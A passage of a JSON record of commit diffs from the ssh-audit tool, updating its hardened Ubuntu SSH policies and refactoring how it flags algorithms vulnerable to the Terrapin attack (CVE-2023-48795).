          "50:         'Hardened Ubuntu Server 20.04 LTS (version 4)': {'version': '4', 'banner': None, 'compressions': None, 'host_keys': ['rsa-sha2-512', 'rsa-sha2-256', 'ssh-ed25519'], 'optional_host_keys': ['sk-ssh-ed25519@openssh.com', 'ssh-ed25519-cert-v01@openssh.com', 'sk-ssh-ed25519-cert-v01@openssh.com', 'rsa-sha2-256-cert-v01@openssh.com', 'rsa-sha2-512-cert-v01@openssh.com'], 'kex': ['curve25519-sha256', 'curve25519-sha256@libssh.org', 'diffie-hellman-group16-sha512', 'diffie-hellman-group18-sha512', 'diffie-hellman-group-exchange-sha256'], 'ciphers': ['chacha20-poly1305@openssh.com', 'aes256-gcm@openssh.com', 'aes128-gcm@openssh.com', 'aes256-ctr', 'aes192-ctr', 'aes128-ctr'], 'macs': ['hmac-sha2-256-etm@openssh.com', 'hmac-sha2-512-etm@openssh.com', 'umac-128-etm@openssh.com'], 'hostkey_sizes': {\"rsa-sha2-256\": {\"hostkey_size\": 4096}, \"rsa-sha2-256-cert-v01@openssh.com\": {\"ca_key_size\": 4096, \"ca_key_type\": \"ssh-rsa\", \"hostkey_size\": 4096}, \"rsa-sha2-512\": {\"hostkey_size\": 4096}, \"rsa-sha2-512-cert-v01@openssh.com\": {\"ca_key_size\": 4096, \"ca_key_type\": \"ssh-rsa\", \"hostkey_size\": 4096}, \"sk-ssh-ed25519-cert-v01@openssh.com\": {\"ca_key_size\": 256, \"ca_key_type\": \"ssh-ed25519\", \"hostkey_size\": 256}, \"sk-ssh-ed25519@openssh.com\": {\"hostkey_size\": 256}, \"ssh-ed25519\": {\"hostkey_size\": 256}, \"ssh-ed25519-cert-v01@openssh.com\": {\"ca_key_size\": 256, \"ca_key_type\": \"ssh-ed25519\", \"hostkey_size\": 256}}, 'dh_modulus_sizes': {'diffie-hellman-group-exchange-sha256': 3072}, 'server_policy': True},",
          "52:         'Hardened Ubuntu Server 22.04 LTS (version 4)': {'version': '4', 'banner': None, 'compressions': None, 'host_keys': ['rsa-sha2-512', 'rsa-sha2-256', 'ssh-ed25519'], 'optional_host_keys': ['sk-ssh-ed25519@openssh.com', 'ssh-ed25519-cert-v01@openssh.com', 'sk-ssh-ed25519-cert-v01@openssh.com', 'rsa-sha2-256-cert-v01@openssh.com', 'rsa-sha2-512-cert-v01@openssh.com'], 'kex': ['sntrup761x25519-sha512@openssh.com', 'curve25519-sha256', 'curve25519-sha256@libssh.org', 'diffie-hellman-group16-sha512', 'diffie-hellman-group18-sha512', 'diffie-hellman-group-exchange-sha256'], 'ciphers': ['chacha20-poly1305@openssh.com', 'aes256-gcm@openssh.com', 'aes128-gcm@openssh.com', 'aes256-ctr', 'aes192-ctr', 'aes128-ctr'], 'macs': ['hmac-sha2-256-etm@openssh.com', 'hmac-sha2-512-etm@openssh.com', 'umac-128-etm@openssh.com'], 'hostkey_sizes': {\"rsa-sha2-256\": {\"hostkey_size\": 4096}, \"rsa-sha2-256-cert-v01@openssh.com\": {\"ca_key_size\": 4096, \"ca_key_type\": \"ssh-rsa\", \"hostkey_size\": 4096}, \"rsa-sha2-512\": {\"hostkey_size\": 4096}, \"rsa-sha2-512-cert-v01@openssh.com\": {\"ca_key_size\": 4096, \"ca_key_type\": \"ssh-rsa\", \"hostkey_size\": 4096}, \"sk-ssh-ed25519-cert-v01@openssh.com\": {\"ca_key_size\": 256, \"ca_key_type\": \"ssh-ed25519\", \"hostkey_size\": 256}, \"sk-ssh-ed25519@openssh.com\": {\"hostkey_size\": 256}, \"ssh-ed25519\": {\"hostkey_size\": 256}, \"ssh-ed25519-cert-v01@openssh.com\": {\"ca_key_size\": 256, \"ca_key_type\": \"ssh-ed25519\", \"hostkey_size\": 256}}, 'dh_modulus_sizes': {'diffie-hellman-group-exchange-sha256': 3072}, 'server_policy': True},",
          "",
          "[Added Lines]",
          "50:         'Hardened Ubuntu Server 20.04 LTS (version 5)': {'version': '5', 'banner': None, 'compressions': None, 'host_keys': ['rsa-sha2-512', 'rsa-sha2-256', 'ssh-ed25519'], 'optional_host_keys': ['sk-ssh-ed25519@openssh.com', 'ssh-ed25519-cert-v01@openssh.com', 'sk-ssh-ed25519-cert-v01@openssh.com', 'rsa-sha2-256-cert-v01@openssh.com', 'rsa-sha2-512-cert-v01@openssh.com'], 'kex': ['curve25519-sha256', 'curve25519-sha256@libssh.org', 'diffie-hellman-group16-sha512', 'diffie-hellman-group18-sha512', 'diffie-hellman-group-exchange-sha256', 'kex-strict-s-v00@openssh.com'], 'ciphers': ['chacha20-poly1305@openssh.com', 'aes256-gcm@openssh.com', 'aes128-gcm@openssh.com', 'aes256-ctr', 'aes192-ctr', 'aes128-ctr'], 'macs': ['hmac-sha2-256-etm@openssh.com', 'hmac-sha2-512-etm@openssh.com', 'umac-128-etm@openssh.com'], 'hostkey_sizes': {\"rsa-sha2-256\": {\"hostkey_size\": 4096}, \"rsa-sha2-256-cert-v01@openssh.com\": {\"ca_key_size\": 4096, \"ca_key_type\": \"ssh-rsa\", \"hostkey_size\": 4096}, \"rsa-sha2-512\": {\"hostkey_size\": 4096}, \"rsa-sha2-512-cert-v01@openssh.com\": {\"ca_key_size\": 4096, \"ca_key_type\": \"ssh-rsa\", \"hostkey_size\": 4096}, \"sk-ssh-ed25519-cert-v01@openssh.com\": {\"ca_key_size\": 256, \"ca_key_type\": \"ssh-ed25519\", \"hostkey_size\": 256}, \"sk-ssh-ed25519@openssh.com\": {\"hostkey_size\": 256}, \"ssh-ed25519\": {\"hostkey_size\": 256}, \"ssh-ed25519-cert-v01@openssh.com\": {\"ca_key_size\": 256, \"ca_key_type\": \"ssh-ed25519\", \"hostkey_size\": 256}}, 'dh_modulus_sizes': {'diffie-hellman-group-exchange-sha256': 3072}, 'server_policy': True},",
          "52:         'Hardened Ubuntu Server 22.04 LTS (version 5)': {'version': '5', 'banner': None, 'compressions': None, 'host_keys': ['rsa-sha2-512', 'rsa-sha2-256', 'ssh-ed25519'], 'optional_host_keys': ['sk-ssh-ed25519@openssh.com', 'ssh-ed25519-cert-v01@openssh.com', 'sk-ssh-ed25519-cert-v01@openssh.com', 'rsa-sha2-256-cert-v01@openssh.com', 'rsa-sha2-512-cert-v01@openssh.com'], 'kex': ['sntrup761x25519-sha512@openssh.com', 'curve25519-sha256', 'curve25519-sha256@libssh.org', 'diffie-hellman-group16-sha512', 'diffie-hellman-group18-sha512', 'diffie-hellman-group-exchange-sha256', 'kex-strict-s-v00@openssh.com'], 'ciphers': ['chacha20-poly1305@openssh.com', 'aes256-gcm@openssh.com', 'aes128-gcm@openssh.com', 'aes256-ctr', 'aes192-ctr', 'aes128-ctr'], 'macs': ['hmac-sha2-256-etm@openssh.com', 'hmac-sha2-512-etm@openssh.com', 'umac-128-etm@openssh.com'], 'hostkey_sizes': {\"rsa-sha2-256\": {\"hostkey_size\": 4096}, \"rsa-sha2-256-cert-v01@openssh.com\": {\"ca_key_size\": 4096, \"ca_key_type\": \"ssh-rsa\", \"hostkey_size\": 4096}, \"rsa-sha2-512\": {\"hostkey_size\": 4096}, \"rsa-sha2-512-cert-v01@openssh.com\": {\"ca_key_size\": 4096, \"ca_key_type\": \"ssh-rsa\", \"hostkey_size\": 4096}, \"sk-ssh-ed25519-cert-v01@openssh.com\": {\"ca_key_size\": 256, \"ca_key_type\": \"ssh-ed25519\", \"hostkey_size\": 256}, \"sk-ssh-ed25519@openssh.com\": {\"hostkey_size\": 256}, \"ssh-ed25519\": {\"hostkey_size\": 256}, \"ssh-ed25519-cert-v01@openssh.com\": {\"ca_key_size\": 256, \"ca_key_type\": \"ssh-ed25519\", \"hostkey_size\": 256}}, 'dh_modulus_sizes': {'diffie-hellman-group-exchange-sha256': 3072}, 'server_policy': True},",
          "",
          "---------------",
          "--- Hunk 2 ---",
          "[Context before]",
          "98:         'Hardened Ubuntu Client 18.04 LTS (version 2)': {'version': '2', 'banner': None, 'compressions': None, 'host_keys': ['ssh-ed25519', 'ssh-ed25519-cert-v01@openssh.com', 'rsa-sha2-256', 'rsa-sha2-512'], 'optional_host_keys': None, 'kex': ['curve25519-sha256', 'curve25519-sha256@libssh.org', 'diffie-hellman-group16-sha512', 'diffie-hellman-group18-sha512', 'diffie-hellman-group-exchange-sha256', 'ext-info-c'], 'ciphers': ['chacha20-poly1305@openssh.com', 'aes256-gcm@openssh.com', 'aes128-gcm@openssh.com', 'aes256-ctr', 'aes192-ctr', 'aes128-ctr'], 'macs': ['hmac-sha2-256-etm@openssh.com', 'hmac-sha2-512-etm@openssh.com', 'umac-128-etm@openssh.com'], 'hostkey_sizes': None, 'dh_modulus_sizes': None, 'server_policy': False},",
          "104:     }",
          "",
          "[Removed Lines]",
          "100:         'Hardened Ubuntu Client 20.04 LTS (version 2)': {'version': '2', 'banner': None, 'compressions': None, 'host_keys': ['ssh-ed25519', 'ssh-ed25519-cert-v01@openssh.com', 'sk-ssh-ed25519@openssh.com', 'sk-ssh-ed25519-cert-v01@openssh.com', 'rsa-sha2-256', 'rsa-sha2-256-cert-v01@openssh.com', 'rsa-sha2-512', 'rsa-sha2-512-cert-v01@openssh.com'], 'optional_host_keys': None, 'kex': ['curve25519-sha256', 'curve25519-sha256@libssh.org', 'diffie-hellman-group16-sha512', 'diffie-hellman-group18-sha512', 'diffie-hellman-group-exchange-sha256', 'ext-info-c'], 'ciphers': ['chacha20-poly1305@openssh.com', 'aes256-gcm@openssh.com', 'aes128-gcm@openssh.com', 'aes256-ctr', 'aes192-ctr', 'aes128-ctr'], 'macs': ['hmac-sha2-256-etm@openssh.com', 'hmac-sha2-512-etm@openssh.com', 'umac-128-etm@openssh.com'], 'hostkey_sizes': None, 'dh_modulus_sizes': None, 'server_policy': False},",
          "102:         'Hardened Ubuntu Client 22.04 LTS (version 3)': {'version': '3', 'banner': None, 'compressions': None, 'host_keys': ['sk-ssh-ed25519-cert-v01@openssh.com', 'ssh-ed25519-cert-v01@openssh.com', 'rsa-sha2-512-cert-v01@openssh.com', 'rsa-sha2-256-cert-v01@openssh.com', 'sk-ssh-ed25519@openssh.com', 'ssh-ed25519', 'rsa-sha2-512', 'rsa-sha2-256'], 'optional_host_keys': None, 'kex': ['sntrup761x25519-sha512@openssh.com', 'curve25519-sha256', 'curve25519-sha256@libssh.org', 'diffie-hellman-group16-sha512', 'diffie-hellman-group18-sha512', 'diffie-hellman-group-exchange-sha256', 'ext-info-c'], 'ciphers': ['chacha20-poly1305@openssh.com', 'aes256-gcm@openssh.com', 'aes128-gcm@openssh.com', 'aes256-ctr', 'aes192-ctr', 'aes128-ctr'], 'macs': ['hmac-sha2-256-etm@openssh.com', 'hmac-sha2-512-etm@openssh.com', 'umac-128-etm@openssh.com'], 'hostkey_sizes': None, 'dh_modulus_sizes': None, 'server_policy': False},",
          "",
          "[Added Lines]",
          "100:         'Hardened Ubuntu Client 20.04 LTS (version 3)': {'version': '3', 'banner': None, 'compressions': None, 'host_keys': ['ssh-ed25519', 'ssh-ed25519-cert-v01@openssh.com', 'sk-ssh-ed25519@openssh.com', 'sk-ssh-ed25519-cert-v01@openssh.com', 'rsa-sha2-256', 'rsa-sha2-256-cert-v01@openssh.com', 'rsa-sha2-512', 'rsa-sha2-512-cert-v01@openssh.com'], 'optional_host_keys': None, 'kex': ['curve25519-sha256', 'curve25519-sha256@libssh.org', 'diffie-hellman-group16-sha512', 'diffie-hellman-group18-sha512', 'diffie-hellman-group-exchange-sha256', 'ext-info-c', 'kex-strict-c-v00@openssh.com'], 'ciphers': ['chacha20-poly1305@openssh.com', 'aes256-gcm@openssh.com', 'aes128-gcm@openssh.com', 'aes256-ctr', 'aes192-ctr', 'aes128-ctr'], 'macs': ['hmac-sha2-256-etm@openssh.com', 'hmac-sha2-512-etm@openssh.com', 'umac-128-etm@openssh.com'], 'hostkey_sizes': None, 'dh_modulus_sizes': None, 'server_policy': False},",
          "102:         'Hardened Ubuntu Client 22.04 LTS (version 4)': {'version': '4', 'banner': None, 'compressions': None, 'host_keys': ['sk-ssh-ed25519-cert-v01@openssh.com', 'ssh-ed25519-cert-v01@openssh.com', 'rsa-sha2-512-cert-v01@openssh.com', 'rsa-sha2-256-cert-v01@openssh.com', 'sk-ssh-ed25519@openssh.com', 'ssh-ed25519', 'rsa-sha2-512', 'rsa-sha2-256'], 'optional_host_keys': None, 'kex': ['sntrup761x25519-sha512@openssh.com', 'curve25519-sha256', 'curve25519-sha256@libssh.org', 'diffie-hellman-group16-sha512', 'diffie-hellman-group18-sha512', 'diffie-hellman-group-exchange-sha256', 'ext-info-c', 'kex-strict-c-v00@openssh.com'], 'ciphers': ['chacha20-poly1305@openssh.com', 'aes256-gcm@openssh.com', 'aes128-gcm@openssh.com', 'aes256-ctr', 'aes192-ctr', 'aes128-ctr'], 'macs': ['hmac-sha2-256-etm@openssh.com', 'hmac-sha2-512-etm@openssh.com', 'umac-128-etm@openssh.com'], 'hostkey_sizes': None, 'dh_modulus_sizes': None, 'server_policy': False},",
          "",
          "---------------"
        ],
        "src/ssh_audit/ssh_audit.py||src/ssh_audit/ssh_audit.py": [
          "File: src/ssh_audit/ssh_audit.py -> src/ssh_audit/ssh_audit.py",
          "--- Hunk 1 ---",
          "[Context before]",
          "433: # Output additional information & notes.",
          "435:     with out:",
          "436:         # Tell user that PuTTY cannot be hardened at the protocol-level.",
          "437:         if client_audit and (software is not None) and (software.product == Product.PuTTY):",
          "",
          "[Removed Lines]",
          "434: def output_info(out: OutputBuffer, software: Optional['Software'], client_audit: bool, any_problems: bool, is_json_output: bool) -> None:",
          "",
          "[Added Lines]",
          "434: def output_info(out: OutputBuffer, software: Optional['Software'], client_audit: bool, any_problems: bool, is_json_output: bool, additional_notes: str) -> None:",
          "",
          "---------------",
          "--- Hunk 2 ---",
          "[Context before]",
          "441:         if any_problems:",
          "442:             out.warn('(nfo) For hardening guides on common OSes, please see: <https://www.ssh-audit.com/hardening_guides.html>')",
          "444:     if not out.is_section_empty() and not is_json_output:",
          "445:         out.head('# additional info')",
          "446:         out.flush_section()",
          "447:         out.sep()",
          "451:     '''Perform post-processing on scan results before reporting them to the user.  Returns a list of algorithms that should not be recommended'''",
          "454:     algorithm_recommendation_suppress_list = []",
          "456:     # If the server is OpenSSH, and the diffie-hellman-group-exchange-sha256 key exchange was found with modulus size 2048, add a note regarding the bug that causes the server to support 2048-bit moduli no matter the configuration.",
          "457:     if (algs.ssh2kex is not None and 'diffie-hellman-group-exchange-sha256' in algs.ssh2kex.kex_algorithms and 'diffie-hellman-group-exchange-sha256' in algs.ssh2kex.dh_modulus_sizes() and algs.ssh2kex.dh_modulus_sizes()['diffie-hellman-group-exchange-sha256'] == 2048) and (banner is not None and banner.software is not None and banner.software.find('OpenSSH') != -1):",
          "",
          "[Removed Lines]",
          "450: def post_process_findings(banner: Optional[Banner], algs: Algorithms, client_audit: bool) -> List[str]:",
          "",
          "[Added Lines]",
          "444:         # Add any additional notes.",
          "445:         if len(additional_notes) > 0:",
          "446:             out.warn(\"(nfo) %s\" % additional_notes)",
          "454: def post_process_findings(banner: Optional[Banner], algs: Algorithms, client_audit: bool) -> Tuple[List[str], str]:",
          "457:     def _add_terrapin_warning(db: Dict[str, Dict[str, List[List[Optional[str]]]]], category: str, algorithm_name: str) -> None:",
          "458:         '''Adds a warning regarding the Terrapin vulnerability for the specified algorithm.'''",
          "459:         # Ensure that a slot for warnings exists for this algorithm.",
          "460:         while len(db[category][algorithm_name]) < 3:",
          "461:             db[category][algorithm_name].append([])",
          "463:         db[category][algorithm_name][2].append(\"vulnerable to the Terrapin attack (CVE-2023-48795), allowing message prefix truncation\")",
          "465:     def _get_chacha_ciphers_enabled(algs: Algorithms) -> List[str]:",
          "466:         '''Returns a list of chacha20-poly1305 ciphers that the peer supports.'''",
          "467:         ret = []",
          "469:         if algs.ssh2kex is not None:",
          "470:             ciphers_supported = algs.ssh2kex.client.encryption if client_audit else algs.ssh2kex.server.encryption",
          "471:             for cipher in ciphers_supported:",
          "472:                 if cipher.startswith(\"chacha20-poly1305\"):",
          "473:                     ret.append(cipher)",
          "475:         return ret",
          "477:     def _get_cbc_ciphers_enabled(algs: Algorithms) -> List[str]:",
          "478:         '''Returns a list of CBC ciphers that the peer supports.'''",
          "479:         ret = []",
          "481:         if algs.ssh2kex is not None:",
          "482:             ciphers_supported = algs.ssh2kex.client.encryption if client_audit else algs.ssh2kex.server.encryption",
          "483:             for cipher in ciphers_supported:",
          "484:                 if cipher.endswith(\"-cbc\"):",
          "485:                     ret.append(cipher)",
          "487:         return ret",
          "489:     def _get_etm_macs_enabled(algs: Algorithms) -> List[str]:",
          "490:         '''Returns a list of ETM MACs that the peer supports.'''",
          "491:         ret = []",
          "493:         if algs.ssh2kex is not None:",
          "494:             macs_supported = algs.ssh2kex.client.mac if client_audit else algs.ssh2kex.server.mac",
          "495:             for mac in macs_supported:",
          "496:                 if mac.endswith(\"-etm@openssh.com\"):",
          "497:                     ret.append(mac)",
          "499:         return ret",
          "503:     algs_to_note = []",
          "",
          "---------------",
          "--- Hunk 3 ---",
          "[Context before]",
          "467:         algorithm_recommendation_suppress_list.append('diffie-hellman-group-exchange-sha256')",
          "469:     # Check for the Terrapin vulnerability (CVE-2023-48795), and mark the vulnerable algorithms.",
          "470:     if algs.ssh2kex is not None and \\",
          "511: # Returns a exitcodes.* flag to denote if any failures or warnings were encountered.",
          "",
          "[Removed Lines]",
          "471:        ((client_audit and 'kex-strict-c-v00@openssh.com' not in algs.ssh2kex.kex_algorithms) or (not client_audit and 'kex-strict-s-v00@openssh.com' not in algs.ssh2kex.kex_algorithms)):  # Strict KEX marker is not present.",
          "473:         def add_terrapin_warning(db: Dict[str, Dict[str, List[List[Optional[str]]]]], category: str, algorithm_name: str) -> None:",
          "474:             while len(db[category][algorithm_name]) < 3:",
          "475:                 db[category][algorithm_name].append([])",
          "477:             db[category][algorithm_name][2].append(\"vulnerable to the Terrapin attack (CVE-2023-48795), allowing message prefix truncation\")",
          "479:         db = SSH2_KexDB.get_db()",
          "481:         # Without the strict KEX marker, these algorithms are always vulnerable.",
          "482:         add_terrapin_warning(db, \"enc\", \"chacha20-poly1305\")",
          "483:         add_terrapin_warning(db, \"enc\", \"chacha20-poly1305@openssh.com\")",
          "485:         cbc_ciphers = []",
          "486:         etm_macs = []",
          "488:         # Find the list of CBC ciphers the peer supports.",
          "489:         ciphers_supported = algs.ssh2kex.client.encryption if client_audit else algs.ssh2kex.server.encryption",
          "490:         for cipher in ciphers_supported:",
          "491:             if cipher.endswith(\"-cbc\"):",
          "492:                 cbc_ciphers.append(cipher)",
          "494:         # Find the list of ETM MACs the peer supports.",
          "495:         macs_supported = algs.ssh2kex.client.mac if client_audit else algs.ssh2kex.server.mac",
          "496:         for mac in macs_supported:",
          "497:             if mac.endswith(\"-etm@openssh.com\"):",
          "498:                 etm_macs.append(mac)",
          "500:         # If at least one CBC cipher and at least one ETM MAC is supported, mark them all as vulnerable.",
          "501:         if len(cbc_ciphers) > 0 and len(etm_macs) > 0:",
          "502:             for cipher in cbc_ciphers:",
          "503:                 add_terrapin_warning(db, \"enc\", cipher)",
          "505:             for mac in etm_macs:",
          "506:                 add_terrapin_warning(db, \"mac\", mac)",
          "508:     return algorithm_recommendation_suppress_list",
          "",
          "[Added Lines]",
          "519:     kex_strict_marker = False",
          "521:        ((client_audit and 'kex-strict-c-v00@openssh.com' in algs.ssh2kex.kex_algorithms) or (not client_audit and 'kex-strict-s-v00@openssh.com' in algs.ssh2kex.kex_algorithms)):  # Strict KEX marker is present.",
          "522:         kex_strict_marker = True",
          "524:     db = SSH2_KexDB.get_db()",
          "526:     # Without the strict KEX marker, the chacha20-poly1305 ciphers are always vulnerable.",
          "527:     for chacha_cipher in _get_chacha_ciphers_enabled(algs):",
          "528:         if kex_strict_marker:",
          "529:             # Inform the user that the target is correctly configured, but another peer may still choose this algorithm without using strict KEX negotiation, which would still result in vulnerability.",
          "530:             algs_to_note.append(chacha_cipher)",
          "531:         else:",
          "532:             _add_terrapin_warning(db, \"enc\", chacha_cipher)",
          "534:     cbc_ciphers_enabled = _get_cbc_ciphers_enabled(algs)",
          "535:     etm_macs_enabled = _get_etm_macs_enabled(algs)",
          "537:     # Without the strict KEX marker, if at least one CBC cipher and at least one ETM MAC is supported, mark them all as vulnerable.",
          "538:     if len(cbc_ciphers_enabled) > 0 and len(etm_macs_enabled) > 0:",
          "539:         for cipher in cbc_ciphers_enabled:",
          "540:             if kex_strict_marker:",
          "541:                 # Inform the user that the target is correctly configured, but another peer may still choose this algorithm without using strict KEX negotiation, which would still result in vulnerability.",
          "542:                 algs_to_note.append(cipher)",
          "543:             else:",
          "544:                 _add_terrapin_warning(db, \"enc\", cipher)",
          "546:         for mac in etm_macs_enabled:",
          "547:             if kex_strict_marker:",
          "548:                 # Inform the user that the target is correctly configured, but another peer may still choose this algorithm without using strict KEX negotiation, which would still result in vulnerability.",
          "549:                 algs_to_note.append(mac)",
          "550:             else:",
          "551:                 _add_terrapin_warning(db, \"mac\", mac)",
          "553:     # Return a note telling the user that, while this target is properly configured, if connected to a vulnerable peer, then a vulnerable connection is still possible.",
          "554:     notes = \"\"",
          "555:     if len(algs_to_note) > 0:",
          "556:         notes = \"Be aware that, while this target properly supports the strict key exchange method (via the kex-strict-?-v00@openssh.com marker) needed to protect against the Terrapin vulnerability (CVE-2023-48795), all peers must also support this feature as well, otherwise the vulnerability will still be present.  The following algorithms would allow an unpatched peer to create vulnerable SSH channels with this target: %s\" % \", \".join(algs_to_note)",
          "558:     return algorithm_recommendation_suppress_list, notes",
          "",
          "---------------",
          "--- Hunk 4 ---",
          "[Context before]",
          "517:     algs = Algorithms(pkm, kex)",
          "519:     # Perform post-processing on the findings to make final adjustments before outputting the results.",
          "522:     with out:",
          "523:         if print_target:",
          "",
          "[Removed Lines]",
          "520:     algorithm_recommendation_suppress_list = post_process_findings(banner, algs, client_audit)",
          "",
          "[Added Lines]",
          "570:     algorithm_recommendation_suppress_list, additional_notes = post_process_findings(banner, algs, client_audit)",
          "",
          "---------------",
          "--- Hunk 5 ---",
          "[Context before]",
          "598:     output_fingerprints(out, algs, aconf.json)",
          "599:     perfect_config = output_recommendations(out, algs, algorithm_recommendation_suppress_list, software, aconf.json, maxlen)",
          "602:     if aconf.json:",
          "603:         out.reset()",
          "",
          "[Removed Lines]",
          "600:     output_info(out, software, client_audit, not perfect_config, aconf.json)",
          "",
          "[Added Lines]",
          "650:     output_info(out, software, client_audit, not perfect_config, aconf.json, additional_notes)",
          "",
          "---------------"
        ]
      }
    },
    {
      "candidate_hash": "d0628f6eb430a15413f840ea1a99b1659b00b21f",
      "candidate_info": {
        "commit_hash": "d0628f6eb430a15413f840ea1a99b1659b00b21f",
        "repo": "jtesta/ssh-audit",
        "commit_url": "https://github.com/jtesta/ssh-audit/commit/d0628f6eb430a15413f840ea1a99b1659b00b21f",
        "files": [
          "src/ssh_audit/algorithms.py",
          "src/ssh_audit/ssh2_kexdb.py"
        ],
        "message": "Updated ext-info-c and ext-info-s key exchanges to include versions of OpenSSH they were first included in.  (#291)",
        "before_after_code_files": [
          "src/ssh_audit/algorithms.py||src/ssh_audit/algorithms.py",
          "src/ssh_audit/ssh2_kexdb.py||src/ssh_audit/ssh2_kexdb.py"
        ]
      },
      "candidate_patch_features": {
        "candidate_earlier_than_patch": 0,
        "same_branch_evolution": 1,
        "olp_code_files": {
          "patch": [
            "src/ssh_audit/ssh2_kexdb.py||src/ssh_audit/ssh2_kexdb.py"
          ],
          "candidate": [
            "src/ssh_audit/ssh2_kexdb.py||src/ssh_audit/ssh2_kexdb.py"
          ]
        }
      },
      "candidate_diff": {
        "src/ssh_audit/algorithms.py||src/ssh_audit/algorithms.py": [
          "File: src/ssh_audit/algorithms.py -> src/ssh_audit/algorithms.py",
          "--- Hunk 1 ---",
          "[Context before]",
          "172:                         if fc > 0:",
          "173:                             faults += pow(10, 2 - i) * fc",
          "174:                     if n not in alg_list:",
          "177:                             continue",
          "178:                         rec[sshv][alg_type]['add'][n] = 0",
          "179:                     else:",
          "",
          "[Removed Lines]",
          "175:                         # Don't recommend certificate or token types; these will only appear in the server's list if they are fully configured & functional on the server.",
          "176:                         if faults > 0 or (alg_type == 'key' and (('-cert-' in n) or (n.startswith('sk-')))) or empty_version:",
          "",
          "[Added Lines]",
          "175:                         # Don't recommend certificate or token types; these will only appear in the server's list if they are fully configured & functional on the server.  Also don't recommend 'ext-info-[cs]' nor 'kex-strict-[cs]-v00@openssh.com' key exchanges.",
          "176:                         if faults > 0 or \\",
          "177:                            (alg_type == 'key' and (('-cert-' in n) or (n.startswith('sk-')))) or \\",
          "178:                            (alg_type == 'kex' and (n.startswith('ext-info-') or n.startswith('kex-strict-'))) or \\",
          "179:                            empty_version:",
          "",
          "---------------"
        ],
        "src/ssh_audit/ssh2_kexdb.py||src/ssh_audit/ssh2_kexdb.py": [
          "File: src/ssh_audit/ssh2_kexdb.py -> src/ssh_audit/ssh2_kexdb.py",
          "--- Hunk 1 ---",
          "[Context before]",
          "160:             'ecdh-sha2-wiRIU8TKjMZ418sMqlqtvQ==': [[], [FAIL_UNPROVEN]],  # sect283k1",
          "161:             'ecdh-sha2-zD/b3hu/71952ArpUG4OjQ==': [[], [FAIL_UNPROVEN, FAIL_SMALL_ECC_MODULUS]],  # sect233k1",
          "162:             'ecmqv-sha2': [[], [FAIL_UNPROVEN]],",
          "165:             'kex-strict-c-v00@openssh.com': [[], [], [], [INFO_STRICT_KEX]],  # Strict KEX marker (countermeasure for CVE-2023-48795).",
          "166:             'kex-strict-s-v00@openssh.com': [[], [], [], [INFO_STRICT_KEX]],  # Strict KEX marker (countermeasure for CVE-2023-48795).",
          "",
          "[Removed Lines]",
          "163:             'ext-info-c': [[], [], [], [INFO_EXTENSION_NEGOTIATION]],  # Extension negotiation (RFC 8308)",
          "164:             'ext-info-s': [[], [], [], [INFO_EXTENSION_NEGOTIATION]],  # Extension negotiation (RFC 8308)",
          "",
          "[Added Lines]",
          "163:             'ext-info-c': [['7.2'], [], [], [INFO_EXTENSION_NEGOTIATION]],  # Extension negotiation (RFC 8308)",
          "164:             'ext-info-s': [['9.6'], [], [], [INFO_EXTENSION_NEGOTIATION]],  # Extension negotiation (RFC 8308)",
          "",
          "---------------"
        ]
      }
    }
  ]
}